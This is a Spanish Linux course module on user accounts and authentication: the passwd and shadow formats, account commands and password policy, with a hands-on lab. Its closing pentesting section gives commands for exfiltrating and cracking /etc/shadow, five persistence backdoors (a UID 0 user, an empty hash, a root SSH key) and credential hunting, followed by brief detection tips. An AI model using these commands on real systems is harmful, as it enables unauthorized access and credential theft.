---
title: "👤 Curso de Linux — Módulo 5: Gestión de Usuarios y Autenticación"
aliases:
  - Linux Usuarios
  - Linux Passwd Shadow
  - Autenticacion Linux
tags:
  - ifct0109/pocs
  - linux
  - usuarios
  - passwd
  - shadow
  - cracking
---

# 👤 Curso de Linux — Módulo 5: Gestión de Usuarios y Autenticación

> [!abstract] Resumen del Módulo
> Estudio detallado de las cuentas de usuario en Linux: usuarios del sistema vs usuarios normales, desglose campo por campo de los ficheros `/etc/passwd` y `/etc/shadow`, algoritmos de cifrado de contraseñas (SHA-512, yescrypt), comandos de ciclo de vida (`useradd`, `usermod`, `userdel`, `passwd`), técnicas de cracking de hashes offline y métodos de persistencia local.

---

# Curso de Linux para Pentesting

Módulo: Gestión de Usuarios

  ← Volver al Índice

## 👤 ¿Qué son los Usuarios en Linux?

Los **usuarios** son cuentas individuales que permiten a personas (o procesos) interactuar con el sistema Linux. Cada usuario tiene:

* 🆔 Un UID (User ID) - identificador numérico único

* 👤 Un nombre de usuario - para iniciar sesión

* 🏠 Un directorio home - espacio personal (típicamente /home/usuario)

* 🐚 Un shell - intérprete de comandos (bash, sh, etc.)

* 🔑 Una contraseña - para autenticación

* 👥 Grupos - grupo primario y grupos secundarios

> [!warning] 🎓 Objetivo de esta sección
>        Aprenderás a:
>
>          Ver información de usuarios del sistema
>          Entender los archivos /etc/passwd y /etc/shadow
>          Crear, modificar y eliminar usuarios
>          Cambiar contraseñas
>          Gestionar el directorio home
>          Cambiar entre usuarios con su

## 👥 Tipos de Usuarios en Linux

##### 🔴 root (UID 0)

**El superusuario - Control total del sistema**

* UID: 0

* Puede hacer: TODO - Sin restricciones

* Home: /root

* Uso: Solo para tareas administrativas

##### 🟢 Usuarios del Sistema (UID 1-999)

**Cuentas para servicios y daemons**

* Ejemplos: www-data, mysql, sshd, nobody

* Propósito: Ejecutar servicios con privilegios limitados

* Shell: Típicamente /usr/sbin/nologin (no pueden iniciar sesión)

##### 🟡 Usuarios Normales (UID 1000+)

**Cuentas para personas reales**

* Primer usuario: UID 1000 (creado durante instalación)

* Siguientes: 1001, 1002, 1003...

* Home: /home/nombre_usuario

* Shell: /bin/bash (pueden iniciar sesión y usar comandos)

## 📄 El Archivo /etc/passwd

##### Archivo: /etc/passwd

Contiene información básica de todos los usuarios del sistema. Es **legible por todos**.

#### Ver el archivo

tecnico@linux:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
tecnico:x:1000:1000:Usuario Tecnico,,,:/home/tecnico:/bin/bash
mysql:x:115:120:MySQL Server,,,:/nonexistent:/bin/false

#### 📊 Formato de cada línea

```bash
usuario:contraseña:UID:GID:info:home:shell
```

**Ejemplo:** `tecnico:x:1000:1000:Usuario Tecnico,,,:/home/tecnico:/bin/bash`

| Campo | Valor | Significado |
| --- | --- | --- |
| 1. Usuario | `tecnico` | Nombre de usuario para login |
| 2. Contraseña | `x` | Contraseña en /etc/shadow |
| 3. UID | `1000` | User ID (identificador único) |
| 4. GID | `1000` | Group ID primario |
| 5. GECOS | `Usuario Tecnico,,,` | Nombre completo e información adicional |
| 6. Home | `/home/tecnico` | Directorio personal del usuario |
| 7. Shell | `/bin/bash` | Intérprete de comandos al iniciar sesión |

> [!warning] 💡 ¿Por qué 'x' en el campo contraseña?
>          Antiguamente, las contraseñas hasheadas se guardaban aquí, pero como /etc/passwd es legible por todos, se movieron a `/etc/shadow` (solo legible por root).
>          La 'x' indica que la contraseña está en /etc/shadow.

## 🔒 El Archivo /etc/shadow

##### Archivo: /etc/shadow

Contiene las contraseñas hasheadas y políticas de contraseña. **Solo legible por root**.

#### Ver el archivo (requiere root)

tecnico@linux:~$ sudo cat /etc/shadow
root:*:19752:0:99999:7:::
daemon:*:19752:0:99999:7:::
www-data:*:19752:0:99999:7:::
tecnico:$6$xyz123abc$xrKVwFm...:19752:0:99999:7:::
mysql:!:19752:0:99999:7:::

#### 📊 Formato de cada línea

```bash
usuario:contraseña_hash:último_cambio:mín:máx:warn:inactivo:expiración:reservado
```

| Campo | Significado |
| --- | --- |
| 1. Usuario | Nombre de usuario |
| 2. Hash | Contraseña encriptada o símbolos especiales |
| 3. Último cambio | Días desde 01/01/1970 del último cambio de contraseña |
| 4. Mínimo | Días mínimos antes de poder cambiar contraseña (0 = sin restricción) |
| 5. Máximo | Días máximos antes de TENER que cambiar contraseña (99999 = nunca) |
| 6. Warning | Días de aviso antes de expirar (7 = avisa 7 días antes) |
| 7. Inactivo | Días tras expirar antes de bloquear la cuenta |
| 8. Expiración | Fecha absoluta de expiración de la cuenta |

#### 🔑 Símbolos en el Campo Contraseña

* `$6$...` - Hash SHA-512 (contraseña válida)

* `!` - Cuenta bloqueada (no puede iniciar sesión)

* `*` - Sin contraseña establecida (no puede iniciar sesión)

* `!!` - Cuenta nunca tuvo contraseña

**Ejemplo de hash SHA-512:**

```bash
$6$rounds=5000$saltsalt$hash...
```

* `$6$` - Algoritmo SHA-512

* `rounds=5000` - Iteraciones del hash

* `saltsalt` - Salt (valor aleatorio)

* `hash...` - Hash resultante

## ➕ Crear Usuarios

### Crear Usuario Básico

#### Comando: `useradd`

Crea un nuevo usuario en el sistema.

**Sintaxis básica (NO crea home ni establece contraseña):**

root@linux:~# useradd juan
root@linux:~# grep juan /etc/passwd
juan:x:1001:1001::/home/juan:/bin/sh
# Usuario creado pero sin directorio home ni contraseña

**Crear usuario completo (recomendado):**

root@linux:~# useradd -m -s /bin/bash -c "Juan Perez" juan
# -m: Crea directorio home
# -s: Especifica shell
# -c: Comentario/nombre completo

root@linux:~# ls -la /home/
drwxr-xr-x 2 juan juan 4096 Feb  6 10:30 juan
# Directorio home creado

**Crear con UID específico:**

root@linux:~# useradd -m -u 2000 -s /bin/bash maria
root@linux:~# id maria
uid=2000(maria) gid=2000(maria) grupos=2000(maria)

**Crear con grupo primario específico:**

root@linux:~# useradd -m -g developers -s /bin/bash pedro
# -g: Grupo primario

**Establecer contraseña:**

root@linux:~# passwd juan
New password:
Retype new password:
passwd: password updated successfully

#### 🎯 Opciones Importantes de useradd

| Opción | Descripción |
| --- | --- |
| `-m` | Crear directorio home |
| `-s SHELL` | Especificar shell (/bin/bash, /bin/sh) |
| `-c "TEXTO"` | Comentario (nombre completo) |
| `-u UID` | Especificar UID |
| `-g GRUPO` | Grupo primario |
| `-G GRUPOS` | Grupos secundarios (separados por comas) |
| `-d DIR` | Directorio home personalizado |
| `-e FECHA` | Fecha de expiración (YYYY-MM-DD) |

### Comando Alternativo: adduser (Debian/Ubuntu)

#### Comando: `adduser`

Script interactivo que facilita la creación (disponible en Debian/Ubuntu).

root@linux:~# adduser carlos
Adding user `carlos' ...
Adding new group `carlos' (1002) ...
Adding new user `carlos' (1002) with group `carlos' ...
Creating home directory `/home/carlos' ...
Copying files from `/etc/skel' ...
New password:
Retype new password:
passwd: password updated successfully
Changing the user information for carlos
Enter the new value, or press ENTER for the default
	Full Name []: Carlos Rodriguez
	Room Number []:
	Work Phone []:
	Home Phone []:
	Other []:
Is the information correct? [Y/n] y

**Ventajas de adduser:**

* ✅ Interactivo - Te pregunta todo paso a paso

* ✅ Crea home automáticamente

* ✅ Copia archivos de /etc/skel

* ✅ Establece contraseña en el mismo proceso

* ✅ Más amigable para principiantes

## ✏️ Modificar Usuarios

#### Comando: `usermod`

Modifica propiedades de un usuario existente.

**Cambiar shell del usuario:**

root@linux:~# usermod -s /bin/zsh juan
root@linux:~# grep juan /etc/passwd
juan:x:1001:1001:Juan Perez:/home/juan:/bin/zsh

**Añadir a grupos secundarios:**

root@linux:~# usermod -aG sudo,docker juan
# ⚠️ IMPORTANTE: Usa -aG (con 'a' de append)
# Sin 'a' eliminarías todos los grupos anteriores

root@linux:~# groups juan
juan : juan sudo docker

**Cambiar directorio home:**

root@linux:~# usermod -d /opt/juan -m juan
# -d: Nuevo home
# -m: Mover contenido del home antiguo

**Cambiar UID:**

root@linux:~# usermod -u 3000 juan

**Bloquear/Desbloquear cuenta:**

root@linux:~# usermod -L juan
# -L: Lock (bloquear) - añade '!' al inicio del hash en /etc/shadow

root@linux:~# usermod -U juan
# -U: Unlock (desbloquear)

**Establecer fecha de expiración:**

root@linux:~# usermod -e 2025-12-31 juan
# Cuenta expira el 31 de diciembre de 2025

## 🗑️ Eliminar Usuarios

#### Comando: `userdel`

Elimina un usuario del sistema.

**Eliminar usuario (sin borrar home):**

root@linux:~# userdel juan
# Elimina el usuario pero deja /home/juan intacto

root@linux:~# ls /home/
juan tecnico
# El directorio sigue ahí

**Eliminar usuario Y su directorio home:**

root@linux:~# userdel -r juan
# -r: Remove (elimina home y spool de correo)

root@linux:~# ls /home/
tecnico
# /home/juan fue eliminado

> [!warning] ⚠️ Importante al Eliminar Usuarios
>
>              Los archivos que pertenecían al usuario quedan "huérfanos" (muestran el UID en lugar del nombre)
>              Buscar archivos del usuario eliminado: `find / -uid 1001 2>/dev/null`
>              No puedes eliminar un usuario que tenga procesos en ejecución
>              No puedes eliminar un usuario que esté actualmente logueado

## 🔑 Gestión de Contraseñas

#### Comando: `passwd`

Cambia la contraseña de un usuario.

**Cambiar tu propia contraseña:**

tecnico@linux:~$ passwd
Current password:
New password:
Retype new password:
passwd: password updated successfully

**Cambiar contraseña de otro usuario (como root):**

root@linux:~# passwd juan
New password:
Retype new password:
passwd: password updated successfully

**Forzar cambio de contraseña en próximo login:**

root@linux:~# passwd -e juan
# El usuario tendrá que cambiar su contraseña al iniciar sesión

**Establecer contraseña sin interacción:**

root@linux:~# echo "juan:nuevapassword" | chpasswd
# Útil para scripts

**Bloquear cuenta (sin eliminarla):**

root@linux:~# passwd -l juan
# -l: Lock - Añade '!' al inicio del hash

root@linux:~# passwd -u juan
# -u: Unlock - Quita el '!'

**Ver estado de la contraseña:**

root@linux:~# passwd -S juan
juan P 02/06/2025 0 99999 7 -1
# P = Password set (contraseña establecida)
# L = Locked (bloqueada)
# NP = No Password (sin contraseña)

## 🔄 Cambiar de Usuario: comando su

#### Comando: `su` (Switch User)

Cambia al contexto de otro usuario sin cerrar sesión.

**Cambiar a root:**

tecnico@linux:~$ su
Password:
root@linux:/home/tecnico# # Ahora eres root
# Nota: Sigues en /home/tecnico (no cambió el directorio)

**Cambiar a root con entorno completo:**

tecnico@linux:~$ su -
Password:
root@linux:~# # Ahora estás en /root
# El guión (-) carga el entorno completo de root

**Cambiar a otro usuario específico:**

tecnico@linux:~$ su - juan
Password:
juan@linux:~$ # Ahora eres juan

**Ejecutar un comando como otro usuario:**

tecnico@linux:~$ su -c "whoami" juan
Password:
juan

**Volver a tu usuario original:**

root@linux:~# exit
tecnico@linux:~$ # De vuelta a tecnico

#### 🆚 Diferencia entre `su` y `su -`

| Comando | Descripción |
| --- | --- |
| `su` | Cambia de usuario pero mantiene el entorno (PATH, variables) del usuario original |
| `su -` | Cambia de usuario Y carga su entorno completo (login shell) |

> [!warning] 🆚 Diferencia entre `su` y `sudo`
>
>             su:  Requiere la contraseña del usuario DESTINO (ej: contraseña de root)
>             sudo:  Requiere TU propia contraseña
>             su:  Cambias completamente de usuario (hasta que hagas exit)
>             sudo:  Ejecutas UN comando con privilegios y vuelves a ser tú

## 🔍 Ver Información de Usuarios

#### Comandos útiles para consultar usuarios

**Ver todos los usuarios del sistema:**

tecnico@linux:~$ cat /etc/passwd
# O solo los nombres:
tecnico@linux:~$ cut -d: -f1 /etc/passwd
root
daemon
bin
sys
tecnico
juan
...

**Ver usuarios normales (UID >= 1000):**

tecnico@linux:~$ awk -F: '$3 >= 1000 {print $1}' /etc/passwd
tecnico
juan
maria

**Ver información completa de un usuario:**

tecnico@linux:~$ id juan
uid=1001(juan) gid=1001(juan) grupos=1001(juan),27(sudo),999(docker)

tecnico@linux:~$ finger juan
Login: juan                           Name: Juan Perez
Directory: /home/juan                 Shell: /bin/bash
Last login: Tue Feb  6 10:30 (CET) on pts/0
No mail.
No Plan.

**Ver usuarios actualmente logueados:**

tecnico@linux:~$ who
tecnico  tty7         2025-02-06 09:15 (:0)
juan     pts/0        2025-02-06 10:30 (192.168.1.100)

tecnico@linux:~$ w
 11:23:45 up  2:08,  2 users,  load average: 0.15, 0.12, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
tecnico  tty7     :0               09:15    2:08m  1:24   0.12s /usr/bin/gnome
juan     pts/0    192.168.1.100    10:30    0.00s  0.04s  0.00s w

**Ver último login de usuarios:**

tecnico@linux:~$ lastlog
Username         Port     From             Latest
root                                       **Never logged in**
tecnico          tty7                      Thu Feb  6 09:15:32 +0100 2025
juan             pts/0    192.168.1.100    Thu Feb  6 10:30:15 +0100 2025

      🎯 Actividad Práctica: Gestión Completa de Usuarios

## 🎯 Actividad Práctica: Gestión Completa de Usuarios

Esta actividad te guiará paso a paso en la gestión completa de un usuario, incluyendo políticas de contraseña y seguridad.

### 📝 Parte 1: Creación y Configuración Básica

#### 1️⃣ Crear el usuario 'ifct'

tecnico@linux:~$ sudo adduser ifct
[sudo] password for tecnico: # Introduce tu contraseña
Adding user `ifct' ...
Adding new group `ifct' (1002) ...
Adding new user `ifct' (1002) with group `ifct' ...
Creating home directory `/home/ifct' ...
Copying files from `/etc/skel' ...
New password: # Introduce una contraseña temporal para ifct
Retype new password:
passwd: password updated successfully
Changing the user information for ifct
Enter the new value, or press ENTER for the default
	Full Name []: Usuario IFCT
	Room Number []:
	Work Phone []:
	Home Phone []:
	Other []:
Is the information correct? [Y/n] y

#### 2️⃣ Añadir el usuario al grupo sudo

tecnico@linux:~$ sudo usermod -a -G sudo ifct
# También puedes usar: sudo usermod -aG sudo ifct

#### 3️⃣ Verificar a qué grupos pertenece

tecnico@linux:~$ groups ifct
ifct : ifct sudo

tecnico@linux:~$ id ifct
uid=1002(ifct) gid=1002(ifct) grupos=1002(ifct),27(sudo)

### 🔐 Parte 2: Gestión de Contraseñas con passwd

#### 4️⃣ Explorar el comando passwd

tecnico@linux:~$ man passwd
# Lee especialmente estas opciones:
# -l: Lock (bloquear cuenta)
# -u: Unlock (desbloquear cuenta)
# -e: Expire (expirar contraseña inmediatamente)
# -S: Status (ver estado de la cuenta)

#### 5️⃣ Consultar el comando chage

tecnico@linux:~$ man chage
# chage permite gestionar políticas de expiración de contraseñas
# -m: Días mínimos antes de poder cambiar contraseña
# -M: Días máximos antes de TENER que cambiar contraseña
# -l: Listar información de expiración

#### 6️⃣ Establecer duración mínima (1 día) y máxima (60 días)

tecnico@linux:~$ sudo chage -m 1 -M 60 ifct
# -m 1: Mínimo 1 día antes de poder cambiar contraseña
# -M 60: Máximo 60 días antes de tener que cambiarla

tecnico@linux:~$ sudo chage -l ifct
Last password change					: Feb 06, 2025
Password expires					: Apr 07, 2025
Password inactive					: never
Account expires						: never
Minimum number of days between password change		: 1
Maximum number of days between password change		: 60
Number of days of warning before password expires	: 7

#### 7️⃣ Obligar a cambiar contraseña en el siguiente inicio

tecnico@linux:~$ sudo passwd -e ifct
passwd: password expiry information changed.
# También puedes usar: sudo chage -d 0 ifct

#### 8️⃣ Revisar el estado de la contraseña

tecnico@linux:~$ sudo passwd -S ifct
ifct P 01/01/1970 1 60 7 -1
# P = Password set (contraseña establecida)
# 01/01/1970 = Fecha del último cambio (0 = expirada)
# 1 = Mínimo de días
# 60 = Máximo de días
# 7 = Días de aviso
# -1 = Sin periodo de inactividad

### 🔄 Parte 3: Cambio de Usuario

#### 9️⃣ Iniciar sesión como ifct

tecnico@linux:~$ su - ifct
Password: # Introduce la contraseña temporal de ifct
You are required to change your password immediately (administrator enforced).
Current password: # Introduce la contraseña temporal de nuevo
New password: # Establece nueva contraseña
Retype new password:
passwd: password updated successfully
ifct@linux:~$ # Ahora eres ifct

# Verificar que estás logueado como ifct:
ifct@linux:~$ whoami
ifct

# Salir de la sesión:
ifct@linux:~$ exit
tecnico@linux:~$

### 🔒 Parte 4: Bloqueo y Desbloqueo de Cuenta

#### 🔟 Bloquear la cuenta

tecnico@linux:~$ sudo passwd -l ifct
passwd: password expiry information changed.

#### 1️⃣1️⃣ Revisar el estado y /etc/shadow

tecnico@linux:~$ sudo passwd -S ifct
ifct L 02/06/2025 1 60 7 -1
# L = Locked (cuenta bloqueada)

tecnico@linux:~$ sudo grep ifct /etc/shadow
ifct:!$6$xyz...:19752:1:60:7:::
# Nota el '!' al inicio del hash - indica cuenta bloqueada

#### 1️⃣2️⃣ Intentar iniciar sesión (NO debe funcionar)

tecnico@linux:~$ su - ifct
Password: # Introduce la contraseña de ifct
su: Authentication failure
# ❌ No permite el acceso - cuenta bloqueada

#### 1️⃣3️⃣ Desbloquear la cuenta

tecnico@linux:~$ sudo passwd -u ifct
passwd: password expiry information changed.

#### 1️⃣4️⃣ Revisar estado y /etc/shadow nuevamente

tecnico@linux:~$ sudo passwd -S ifct
ifct P 02/06/2025 1 60 7 -1
# P = Password set (cuenta activa)

tecnico@linux:~$ sudo grep ifct /etc/shadow
ifct:$6$xyz...:19752:1:60:7:::
# El '!' desapareció - cuenta desbloqueada

#### 1️⃣5️⃣ Iniciar sesión ahora (SÍ debe funcionar)

tecnico@linux:~$ su - ifct
Password:
ifct@linux:~$ # ✅ Funciona correctamente

ifct@linux:~$ exit
tecnico@linux:~$

### 🛡️ Parte 5: Políticas de Seguridad de Contraseñas

#### 1️⃣6️⃣ Instalar libpwquality-tools

tecnico@linux:~$ sudo apt update
tecnico@linux:~$ sudo apt install libpwquality-tools
Reading package lists... Done
Building dependency tree... Done
The following NEW packages will be installed:
  libpwquality-tools
...

#### 1️⃣7️⃣ Revisar la utilidad pwscore

tecnico@linux:~$ man pwscore
# pwscore califica la calidad de una contraseña (0-100)

tecnico@linux:~$ echo "123456" | pwscore
Password quality check failed:
 The password is shorter than 8 characters
0

tecnico@linux:~$ echo "P@ssw0rd123!" | pwscore
62
# Puntuación de 62/100

tecnico@linux:~$ echo "MyS3cur3P@ssw0rd2025!" | pwscore
87
# Mejor puntuación

#### 1️⃣8️⃣ Revisar el archivo de configuración

tecnico@linux:~$ cat /etc/security/pwquality.conf
# Configuration for systemwide password quality limits
# Defaults:
#
# Number of characters in the new password that must not be present in the
# old password.
# difok = 1
#
# Minimum acceptable size for the new password (plus one if
# credits are not disabled which is the default)
# minlen = 8
#
# The maximum credit for having digits in the new password.
# dcredit = 0
...

#### 1️⃣9️⃣ Establecer tamaño mínimo de 8 caracteres

tecnico@linux:~$ sudo nano /etc/security/pwquality.conf
# Buscar la línea: # minlen = 8
# Descomentarla y asegurarse que dice:
minlen = 8

# También puedes añadir otras políticas:
minlen = 8
dcredit = -1    # Al menos 1 dígito
ucredit = -1    # Al menos 1 mayúscula
lcredit = -1    # Al menos 1 minúscula
ocredit = -1    # Al menos 1 símbolo especial

# Guardar con Ctrl+O, Enter, Ctrl+X

#### 2️⃣0️⃣ Obligar de nuevo a cambiar contraseña

tecnico@linux:~$ sudo passwd -e ifct
passwd: password expiry information changed.

#### 2️⃣1️⃣ Probar con contraseña débil

tecnico@linux:~$ su - ifct
Password:
You are required to change your password immediately (administrator enforced).
Current password:
New password: # Intenta poner "123" o "abc"
BAD PASSWORD: The password is shorter than 8 characters
New password: # Intenta "12345678"
BAD PASSWORD: The password fails the dictionary check
New password: # Pon una contraseña segura: "Ifct2025!"
Retype new password:
passwd: password updated successfully
ifct@linux:~$ exit
tecnico@linux:~$

#### 2️⃣2️⃣ Revisar /etc/login.defs

tecnico@linux:~$ cat /etc/login.defs
#
# Please note that the parameters in this configuration file control the
# behavior of the tools from the shadow-utils component. None of these
# tools uses the PAM mechanism, and the utilities that use PAM (such as the
# passwd command) should therefore be configured elsewhere.
#

#
# Password aging controls:
#
#	PASS_MAX_DAYS	Maximum number of days a password may be used.
#	PASS_MIN_DAYS	Minimum number of days allowed between password changes.
#	PASS_MIN_LEN	Minimum acceptable password length.
#	PASS_WARN_AGE	Number of days warning given before a password expires.
#
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_MIN_LEN	5
PASS_WARN_AGE	7

#
# Min/max values for automatic uid selection in useradd
#
UID_MIN			 1000
UID_MAX			60000

#
# Min/max values for automatic gid selection in groupadd
#
GID_MIN			 1000
GID_MAX			60000
...

# Valores importantes:
# PASS_MAX_DAYS: Días antes de expirar contraseña (por defecto)
# PASS_MIN_DAYS: Días mínimos entre cambios
# PASS_WARN_AGE: Días de aviso antes de expirar
# UID_MIN/MAX: Rango de UIDs para usuarios normales

### 🗑️ Parte 6: Limpieza Final

#### 2️⃣3️⃣ Eliminar el usuario de prueba

# Asegurarse de no estar logueado como ifct:
tecnico@linux:~$ whoami
tecnico

# Eliminar usuario Y su directorio home:
tecnico@linux:~$ sudo userdel -r ifct
userdel: ifct mail spool (/var/mail/ifct) not found

# Verificar que fue eliminado:
tecnico@linux:~$ grep ifct /etc/passwd
# No devuelve nada - usuario eliminado correctamente

tecnico@linux:~$ ls /home/
tecnico
# /home/ifct fue eliminado

### ✅ ¡Actividad Completada!

Has practicado la gestión completa de usuarios en Linux, incluyendo políticas de seguridad y contraseñas.

#### 📝 Resumen de Comandos Utilizados

* `sudo adduser ifct` - Crear usuario interactivamente

* `sudo usermod -aG sudo ifct` - Añadir a grupo sudo

* `groups ifct` - Ver grupos del usuario

* `sudo passwd -m 1 -M 60 ifct` - Políticas de contraseña

* `sudo passwd -e ifct` - Expirar contraseña

* `sudo passwd -S ifct` - Ver estado de contraseña

* `sudo passwd -l ifct` - Bloquear cuenta

* `sudo passwd -u ifct` - Desbloquear cuenta

* `su - ifct` - Cambiar a usuario ifct

* `sudo apt install libpwquality-tools` - Instalar herramientas de calidad de contraseña

* `pwscore` - Calificar calidad de contraseña

* `/etc/security/pwquality.conf` - Configurar políticas de contraseña

* `/etc/login.defs` - Configuración por defecto de usuarios

* `sudo userdel -r ifct` - Eliminar usuario y su home

## ⚔️ Aplicaciones en Pentesting y Hacking Ético

A continuación encontrarás información avanzada sobre cómo se explotan usuarios en pentesting, técnicas de enumeración, persistencia y cracking de contraseñas.

💡 Haz clic en cada sección para expandir el contenido

## 🎯 Técnicas de Pentesting con Usuarios

      🔍 Enumeración de Usuarios Post-Compromiso

#### Objetivo: Mapear todos los usuarios y buscar cuentas interesantes

Tras comprometer un sistema, enumerar usuarios te ayuda a identificar objetivos para escalada de privilegios y movimiento lateral.

#### 📋 Checklist de Enumeración

**1. Listar todos los usuarios:**

www-data@target:~$ cat /etc/passwd
www-data@target:~$ cut -d: -f1 /etc/passwd | sort

**2. Identificar usuarios con shell válido:**

www-data@target:~$ grep -v 'nologin\|false' /etc/passwd
root:x:0:0:root:/root:/bin/bash
admin:x:1000:1000:Admin User:/home/admin:/bin/bash
backup:x:1001:1001:Backup User:/home/backup:/bin/sh
# Estos usuarios PUEDEN iniciar sesión

**3. Buscar usuarios con UID 0 (root):**

www-data@target:~$ awk -F: '$3 == 0 {print $1}' /etc/passwd
root
backdoor
# ⚠️ Si hay más de 'root', hay una backdoor

**4. Ver usuarios con home directories:**

www-data@target:~$ ls -la /home/
drwxr-xr-x  5 admin   admin   4096 Feb  6 09:15 admin
drwxr-xr-x  3 backup  backup  4096 Jan 10 14:22 backup
drwxr-xr-x  2 olduser olduser 4096 Dec 25 10:00 olduser

**5. Verificar quién puede usar sudo:**

www-data@target:~$ grep -E '^sudo|^admin' /etc/group
sudo:x:27:admin,backup
# admin y backup pueden usar sudo

**6. Ver últimos logins:**

www-data@target:~$ lastlog
www-data@target:~$ last -a
# Identifica usuarios activos vs abandonados

#### 🎯 Usuarios Interesantes para Pentesting

* Administradores: Usuarios en grupo sudo/admin

* Cuentas de servicio: mysql, postgres, apache - pueden tener credenciales en configs

* Backups: Usuarios de backup pueden tener acceso a archivos sensibles

* Cuentas abandonadas: Usuarios que no han logueado recientemente - posibles contraseñas débiles

* UIDs inusuales: UID 0 (backdoor), UIDs muy altos

      🔓 Cracking de /etc/shadow con John the Ripper

#### Objetivo: Obtener contraseñas en texto plano desde /etc/shadow

Si tienes acceso de lectura a /etc/shadow, puedes intentar crackear las contraseñas hasheadas.

#### 📥 Paso 1: Extraer los hashes

# En el sistema comprometido:
www-data@target:~$ cat /etc/passwd > passwd.txt
www-data@target:~$ cat /etc/shadow > shadow.txt
# Transferir ambos archivos a tu máquina atacante

#### 🔨 Paso 2: Combinar archivos con unshadow

# En tu máquina Kali:
kali@attacker:~$ unshadow passwd.txt shadow.txt > combined.txt
kali@attacker:~$ cat combined.txt
admin:$6$xyz123$xrKVwFm...:1000:1000:Admin:/home/admin:/bin/bash
backup:$6$abc789$mnoPQrs...:1001:1001:Backup:/home/backup:/bin/bash

#### ⚡ Paso 3: Crackear con John the Ripper

# Ataque de diccionario con rockyou.txt:
kali@attacker:~$ john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
password123      (admin)
backup2024       (backup)
2g 0:00:01:23 DONE (2025-02-06 11:45) 0.02406g/s 1234p/s 2468c/s 2468C/s
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

#### 🔍 Ver contraseñas crackeadas

kali@attacker:~$ john --show combined.txt
admin:password123:1000:1000:Admin:/home/admin:/bin/bash
backup:backup2024:1001:1001:Backup:/home/backup:/bin/bash

2 password hashes cracked, 0 left

#### ⚡ Ataques Avanzados

# Ataque de fuerza bruta incremental:
kali@attacker:~$ john --incremental combined.txt

# Ataque con reglas (mutaciones):
kali@attacker:~$ john --wordlist=rockyou.txt --rules combined.txt

# Mostrar progreso:
kali@attacker:~$ john --status

# Formato específico (si falla la detección):
kali@attacker:~$ john --format=sha512crypt combined.txt

> [!warning] 💡 Alternativas a John the Ripper
>
>               Hashcat:  Más rápido, usa GPU
>
>
> ```bash
hashcat -m 1800 -a 0 shadow.txt rockyou.txt
```
>
>
>
>               Hydra:  Para ataques en línea (SSH, FTP, etc.)

      💀 Técnicas de Persistencia con Usuarios

#### Objetivo: Mantener acceso al sistema tras compromiso inicial

Crear usuarios backdoor o modificar usuarios existentes para mantener acceso persistente.

#### 🚪 Método 1: Usuario Backdoor con UID 0

# Crear usuario con UID 0 (equivalente a root):
root@target:~# useradd -u 0 -o -g 0 -M -d /root -s /bin/bash backdoor
root@target:~# echo "backdoor:password123" | chpasswd

# Verificar:
root@target:~# grep backdoor /etc/passwd
backdoor:x:0:0::/root:/bin/bash

# Login como backdoor:
atacante@local:~$ ssh backdoor@target
backdoor@target:~# # ¡Acceso root!

#### 🚪 Método 2: Usuario sin Contraseña

# Editar /etc/shadow y dejar el campo hash vacío:
root@target:~# sed -i 's/^backdoor:[^:]*:/backdoor::/' /etc/shadow

# O directamente con perl:
root@target:~# perl -i -pe 's/^backdoor:[^:]*:/backdoor::/' /etc/shadow

# Ahora puedes hacer su sin contraseña:
usuario@target:~$ su backdoor
backdoor@target:~# # Sin pedir contraseña

#### 🚪 Método 3: Añadir Línea Directamente a /etc/passwd

# Generar hash de contraseña:
kali@attacker:~$ openssl passwd -6 -salt xyz password123
$6$xyz$hash...

# Añadir usuario con hash incluido en /etc/passwd (legacy):
root@target:~# echo 'hacker:$6$xyz$hash...:0:0::/root:/bin/bash' >> /etc/passwd
# Solo funciona si el sistema acepta hashes en /etc/passwd (raro)

#### 🚪 Método 4: Modificar Usuario Existente Deshabilitado

# Buscar cuentas de servicio deshabilitadas:
root@target:~# grep '/nologin' /etc/passwd
backup:x:1001:1001::/var/backups:/usr/sbin/nologin

# Activar shell y establecer contraseña:
root@target:~# usermod -s /bin/bash backup
root@target:~# echo "backup:secretpass" | chpasswd

# Menos sospechoso que crear usuario nuevo

#### 🚪 Método 5: Añadir Clave SSH

# En tu máquina:
kali@attacker:~$ ssh-keygen -t rsa -f backdoor_key
kali@attacker:~$ cat backdoor_key.pub
ssh-rsa AAAAB3NzaC1yc2E...

# En el target:
root@target:~# mkdir -p /root/.ssh
root@target:~# echo "ssh-rsa AAAAB3NzaC1yc2E..." >> /root/.ssh/authorized_keys
root@target:~# chmod 600 /root/.ssh/authorized_keys

# Login sin contraseña:
kali@attacker:~$ ssh -i backdoor_key root@target
root@target:~#

#### ⚠️ Detección de Backdoors

**Blue Team - Cómo detectar estas técnicas:**

* Auditar usuarios con UID 0: `awk -F: '$3 == 0' /etc/passwd`

* Buscar usuarios sin contraseña: `awk -F: '$2 == ""' /etc/shadow`

* Monitorear creación de usuarios: `ausearch -m ADD_USER`

* Verificar integridad de /etc/passwd y /etc/shadow con AIDE/Tripwire

* Revisar claves SSH en usuarios privilegiados

      ↔️ Movimiento Lateral entre Usuarios

#### Objetivo: Comprometer otros usuarios del sistema

Después de comprometer un usuario, buscar formas de pivotar a otros usuarios, especialmente aquellos con más privilegios.

#### 🔍 Técnica 1: Buscar Credenciales en Archivos

# Buscar archivos de configuración con posibles credenciales:
www-data@target:~$ grep -r "password" /home/ 2>/dev/null
www-data@target:~$ grep -r "passwd" /var/www/ 2>/dev/null

# Buscar en historiales de bash:
www-data@target:~$ cat /home/*/.bash_history | grep -E 'password|passwd|su |ssh '

# Buscar scripts con credenciales hardcodeadas:
www-data@target:~$ find /home -name "*.sh" -exec grep -l "password" {} \; 2>/dev/null

#### 🔍 Técnica 2: Aprovechar Permisos Laxos

# Buscar archivos legibles con credenciales de otros usuarios:
usuario1@target:~$ find /home -type f -readable 2>/dev/null | xargs grep -l "password" 2>/dev/null

